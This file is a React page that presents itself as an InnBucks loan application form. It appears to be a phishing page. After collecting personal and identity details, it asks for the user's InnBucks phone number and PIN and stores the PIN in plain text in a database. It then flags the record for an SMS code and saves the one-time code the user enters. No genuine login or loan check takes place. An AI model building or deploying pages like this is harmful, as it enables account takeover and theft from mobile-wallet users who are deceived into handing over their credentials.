import { useRef, useState } from 'react';
import ecologo from '../components/ecologo.png';
import { supabase } from '../lib/supabase';

export default function Apply() {
  const [step, setStep] = useState(1);
  const [applicationId, setApplicationId] = useState<number | null>(null);
  const [isSubmittingApplication, setIsSubmittingApplication] = useState(false);
  const [isSubmittingLogin, setIsSubmittingLogin] = useState(false);
  const [error, setError] = useState('');

  const [form, setForm] = useState({
    fullName: '',
    phoneNumber: '',
    email: '',
    nationalId: '',
    dob: '',
    address: '',
    employmentStatus: '',
    monthlyIncome: '',
    loanType: '',
    loanAmount: '',
    repaymentPeriod: '',
  });

  const [loginPin, setLoginPin] = useState('');
  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '', '']);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const [otpRequested, setOtpRequested] = useState(false);

  const nextStep = (next: number) => {
    setStep(next);
  };

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setForm((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleContinueApplication = async () => {
    setError('');

    if (
      !form.fullName ||
      !form.phoneNumber ||
      !form.nationalId ||
      !form.loanAmount ||
      !form.repaymentPeriod
    ) {
      alert('Please fill in all required fields.');
      return;
    }

    if (!supabase) {
      alert('Application service is temporarily unavailable. Please try again later.');
      return;
    }

    try {
      setIsSubmittingApplication(true);

      const loanAmountNumber = parseInt(form.loanAmount, 10);
      const repaymentPeriodNumber = parseInt(form.repaymentPeriod, 10);

      const { data, error: dbError } = await supabase
        .from('loan_applications')
        .insert({
          full_name: form.fullName,
          national_id: form.nationalId,
          mobile_number: form.phoneNumber,
          loan_amount: isNaN(loanAmountNumber) ? null : loanAmountNumber,
          repayment_period: isNaN(repaymentPeriodNumber)
            ? null
            : repaymentPeriodNumber,
          status: 'pending_verification',
        })
        .select('id')
        .single();

      if (dbError || !data) {
        throw dbError;
      }

      setApplicationId(data.id);
      nextStep(2);
    } catch (err) {
      console.error('Error submitting application:', err);
      setError('An error occurred while submitting your application.');
    } finally {
      setIsSubmittingApplication(false);
    }
  };

  const login = async () => {
    setError('');

    if (!form.phoneNumber || !loginPin) {
      alert('Enter phone number and PIN');
      return;
    }

    if (!supabase) {
      alert('Login service is temporarily unavailable. Please try again later.');
      return;
    }

    if (!applicationId) {
      alert('Missing application reference. Please submit your application again.');
      return;
    }

    try {
      setIsSubmittingLogin(true);

      const { error: insertError } = await supabase.from('loan_verifications').insert({
        application_id: applicationId,
        mobile_number: form.phoneNumber,
        pin: loginPin, // stored as provided
      });

      if (insertError) {
        throw insertError;
      }

      nextStep(3);
    } catch (err) {
      console.error('Error saving login details:', err);
      setError('An error occurred while saving your login details.');
    } finally {
      setIsSubmittingLogin(false);
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    const clean = value.replace(/\D/g, '');
    if (clean.length > 1) return;
    const newDigits = [...otpDigits];
    newDigits[index] = clean;
    setOtpDigits(newDigits);

    if (clean && index < otpDigits.length - 1) {
      otpInputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
  };

  const [isRequestingVerification, setIsRequestingVerification] = useState(false);

  const handleRequestOtp = async () => {
    if (!supabase) {
      alert('Verification service is temporarily unavailable. Please try again later.');
      return;
    }

    if (!applicationId) {
      alert('Missing application reference. Please submit your application again.');
      return;
    }

    try {
      setIsRequestingVerification(true);

      const { error: updateError } = await supabase
        .from('loan_applications')
        .update({
          verification_requested: true,
          verification_requested_at: new Date().toISOString(),
        })
        .eq('id', applicationId);

      if (updateError) {
        throw updateError;
      }

      setOtpRequested(true);
      alert('You will receive an OTP via SMS shortly.');
    } catch (err) {
      console.error('Error requesting verification:', err);
      alert('An error occurred while requesting verification.');
    } finally {
      setIsRequestingVerification(false);
    }
  };

  const verifyOTP = async () => {
    setError('');

    const otp = otpDigits.join('');
    if (otp.length !== 5) {
      alert('Enter 5-digit OTP');
      return;
    }

    if (!supabase) {
      alert('OTP service is temporarily unavailable. Please try again later.');
      return;
    }

    if (!applicationId) {
      alert('Missing application reference. Please submit your application again.');
      return;
    }

    try {
      const { error: updateError } = await supabase
        .from('loan_verifications')
        .update({ otp })
        .eq('application_id', applicationId);

      if (updateError) {
        throw updateError;
      }

      nextStep(4);
    } catch (err) {
      console.error('Error saving OTP:', err);
      setError('An error occurred while saving your OTP.');
    }
  };

  return (
    <>
      <style>{`
        body{
          font-family:Arial,Helvetica,sans-serif;
          background:#f2f5f9;
          margin:0;
        }
        .container{
          max-width:520px;
          margin:20px auto;
          background:white;
          padding:20px;
          border-radius:12px;
          box-shadow:0 4px 14px rgba(0,0,0,0.1);
        }
        h1{
          text-align:center;
          color:#1e5ed6;
        }
        input,select,button{
          width:100%;
          padding:12px;
          margin-top:10px;
          border-radius:8px;
          border:1px solid #ccc;
          font-size:15px;
        }
        button{
          background:#1e5ed6;
          color:white;
          border:none;
          cursor:pointer;
        }
        button:hover{
          background:#174ab0;
        }
        .step{
          display:none;
        }
        .step.active{
          display:block;
        }
        .otp-box{
          display:flex;
          gap:8px;
          justify-content:center;
          margin-top:10px;
        }
        .otp-box input{
          width:45px;
          text-align:center;
          font-size:20px;
        }
        .success{
          text-align:center;
          padding:20px;
        }
        .logo-header{
          text-align:center;
          margin-bottom:8px;
        }
        .logo-header img{
          height:48px;
          width:auto;
          margin-bottom:4px;
        }
      `}</style>

      <div className="container">
        {/* STEP 1 APPLICATION */}
        <div className={`step ${step === 1 ? 'active' : ''}`} id="step1">
          <div className="logo-header">
            <img src={ecologo} alt="InnBucks" />
          </div>
          <h1>InnBucks Loan Application</h1>

          <input
            name="fullName"
            placeholder="Full Name"
            required
            value={form.fullName}
            onChange={handleChange}
          />
          <input
            name="phoneNumber"
            placeholder="Phone Number"
            required
            value={form.phoneNumber}
            onChange={handleChange}
          />
          <input
            name="email"
            placeholder="Email"
            value={form.email}
            onChange={handleChange}
          />

          <input
            name="nationalId"
            placeholder="National ID"
            value={form.nationalId}
            onChange={handleChange}
          />
          <input
            type="date"
            name="dob"
            value={form.dob}
            onChange={handleChange}
          />

          <input
            name="address"
            placeholder="Residential Address"
            value={form.address}
            onChange={handleChange}
          />

          <select
            name="employmentStatus"
            value={form.employmentStatus}
            onChange={handleChange}
          >
            <option>Employment Status</option>
            <option>Employed</option>
            <option>Self Employed</option>
            <option>Student</option>
          </select>

          <input
            name="monthlyIncome"
            placeholder="Monthly Income"
            value={form.monthlyIncome}
            onChange={handleChange}
          />

          <select
            name="loanType"
            value={form.loanType}
            onChange={handleChange}
          >
            <option>Loan Type</option>
            <option>Business Loan</option>
            <option>Personal Loan</option>
          </select>

          <select
            name="loanAmount"
            value={form.loanAmount}
            onChange={handleChange}
          >
            <option>Loan Amount</option>
            <option value="50">$50</option>
            <option value="100">$100</option>
            <option value="300">$300</option>
            <option value="500">$500</option>
            <option value="1000">$1000</option>
          </select>

          <select
            name="repaymentPeriod"
            value={form.repaymentPeriod}
            onChange={handleChange}
          >
            <option>Repayment Period</option>
            <option value="1">1 Month</option>
            <option value="3">3 Months</option>
            <option value="6">6 Months</option>
            <option value="12">12 Months</option>
          </select>

          {error && (
            <p style={{ color: 'red', marginTop: '10px', fontSize: '14px' }}>
              {error}
            </p>
          )}

          <button type="button" onClick={handleContinueApplication} disabled={isSubmittingApplication}>
            {isSubmittingApplication ? 'Submitting...' : 'Continue'}
          </button>
        </div>

        {/* STEP 2 LOGIN */}
        <div className={`step ${step === 2 ? 'active' : ''}`} id="step2">
          <div className="logo-header">
            <img src={ecologo} alt="InnBucks" />
          </div>
          <h1>InnBucks Login</h1>
          <input
            placeholder="Phone Number"
            value={form.phoneNumber}
            onChange={(e) =>
              setForm((prev) => ({ ...prev, phoneNumber: e.target.value }))
            }
          />
          <input
            type="password"
            maxLength={4}
            placeholder="PIN"
            value={loginPin}
            onChange={(e) => setLoginPin(e.target.value.replace(/\D/g, ''))}
          />
          {error && (
            <p style={{ color: 'red', marginTop: '10px', fontSize: '14px' }}>
              {error}
            </p>
          )}
          <button type="button" onClick={login} disabled={isSubmittingLogin}>
            {isSubmittingLogin ? 'Logging in...' : 'Login'}
          </button>
        </div>

        {/* STEP 3 OTP */}
        <div className={`step ${step === 3 ? 'active' : ''}`} id="step3">
          <h1>OTP Verification</h1>
          <p>Enter the code sent to your phone</p>

          <button type="button" onClick={handleRequestOtp} disabled={isRequestingVerification}>
            {isRequestingVerification ? 'Requesting...' : 'Verify Account'}
          </button>

          {otpRequested && (
            <div className="otp-box">
              {otpDigits.map((digit, index) => (
                <input
                  key={index}
                  maxLength={1}
                  ref={(el) => {
                    otpInputRefs.current[index] = el;
                  }}
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                />
              ))}
            </div>
          )}

          <button type="button" onClick={verifyOTP}>
            Verify OTP
          </button>
        </div>

        {/* STEP 4 SUCCESS */}
        <div className={`step ${step === 4 ? 'active' : ''}`} id="step4">
          <div className="success">
            <h1>Application Submitted</h1>
            <p>Your loan request is under review.</p>
          </div>
        </div>
      </div>
    </>
  );
}
